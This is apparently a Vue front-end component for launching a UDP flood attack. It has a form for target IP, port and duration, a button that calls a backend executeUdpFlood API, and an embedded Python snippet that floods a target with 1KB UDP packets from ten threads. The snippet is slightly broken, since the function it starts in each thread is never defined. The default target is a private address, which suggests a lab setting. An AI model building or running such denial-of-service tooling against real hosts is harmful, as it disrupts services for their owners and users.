<template>
  <div id="start-hijack">
    <a-card title="UDP泛洪攻击">
      <template #extra>
        <a-button type="primary" @click="resetToDefaults">填充默认值</a-button>
      </template>

      <a-form :layout="formLayout" :model="formState">
        <a-row :gutter="24">
          <!-- 左列 -->
          <a-col :span="12">
            <a-form-item label="目标IP">
              <a-input v-model:value="formState.dstIp" placeholder="请输入目标IP (dst_ip)" />
            </a-form-item>
          </a-col>

          <!-- 右列 -->
          <a-col :span="12">
            <a-form-item label="目标端口">
              <a-input v-model:value="formState.dstPort" placeholder="请输入目标端口 (dst_port)" />
            </a-form-item>
          </a-col>
        </a-row>


        <a-row :gutter="24">
          <a-col :span="24">
            <a-form-item label="攻击持续时间 (attack_duration)">
              <a-input
                v-model:value="formState.attackDuration"
                placeholder="单位：秒"
              />
            </a-form-item>
          </a-col>
        </a-row>

      </a-form>

    </a-card>

    <a-card title="UDP泛洪攻击核心代码">
      <pre><code class="language-python">{{ pythonCode }}</code></pre>
    </a-card>

    <div class="container-button">
      <a-button
        type="primary"
        @click="handleClickAttack"
        :loading="isLoadingAttack"
        class="large-button"
        danger
      >
        执行攻击
      </a-button>
    </div>

    <!-- 条件渲染Alert组件 -->
    <a-alert
      v-if="showAlert"
      message="Success! 成功执行"
      description="已成功执行泛洪攻击"
      type="success"
      show-icon
      closable
      @close="showAlert = false"
    />

  </div>
</template>

<script setup lang="ts">
import { ref, onMounted } from 'vue'
import type { FloodAttackParams } from '@/utils/types'
import { executeUdpFlood } from '@/api/executeFlood.ts'

const formLayout = 'vertical'; // 设置表单布局


// 定义初始值对象
const defaultValues = ref<FloodAttackParams>({
  dstIp: '192.168.169.1',      // 目标IP
  dstPort: 8800,               // 目标端口
  attackDuration: 5           // 攻击持续时间
});

// 创建一个对象来存储表单的状态
const formState = ref<FloodAttackParams>({
  dstIp: '',
  dstPort: 0,
  attackDuration: 0
});

// 创建一个方法来重置表单状态为初始值
const resetToDefaults = () => {
  formState.value = defaultValues.value;
};

const pythonCode = ref( `import socket
import time
import threading

MESSAGE = b"A" * 1024  # 1KB 的数据包
start_time = time.time()
# 创建 UDP 套接字
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
while time.time() - start_time < attack_duration:
    # 发送数据包
    sock.sendto(MESSAGE, (TARGET_IP, TARGET_PORT))

# 多线程攻击
THREAD_COUNT = 10
threads = []
for _ in range(THREAD_COUNT):
        thread = threading.Thread(target=udp_attack)
        threads.append(thread)
        thread.start()
for thread in threads:
    thread.join()
`);

onMounted(() => {
  // 这里爆红不用管，已经全局引入了。 放在onMounted里面可以保证其他组件加载完毕后 再引入prism进行代码高亮
  import('prismjs').then(prism => prism.highlightAll());
});

// 是否显示弹窗
const showAlert = ref(false);

// 处理按钮点击事件的方法
const isLoadingAttack = ref(false);


const handleClickAttack = async () => {
  try {
    // 设置按钮加载状态为 true
    isLoadingAttack.value = true;

    // 调用 executeUdpFlood 接口
    const response = await executeUdpFlood({
      dstIp: formState.value.dstIp,
      dstPort: formState.value.dstPort,
      attackDuration: formState.value.attackDuration
    });

    // 根据后端返回的数据执行相应操作
    // console.log(response.data);
    showAlert.value = true;

  } catch (error) {
    // 处理错误
    console.error('There was an error!', error);
  } finally {
    // 不管请求成功与否，最后都将加载状态设置为 false
    isLoadingAttack.value = false;
  }
};
</script>

<style scoped>
.container-button {
  text-align: center;
  padding: 20px;
}
.normal-button {
  width: 150px; /* 设置宽度 */
  height: 40px; /* 设置高度 */
  font-size: 14px; /* 可选：增加字体大小以适应更大的按钮 */
}
.large-button {
  width: 200px; /* 设置宽度 */
  height: 50px; /* 设置高度 */
  font-size: 16px; /* 可选：增加字体大小以适应更大的按钮 */
}
</style>
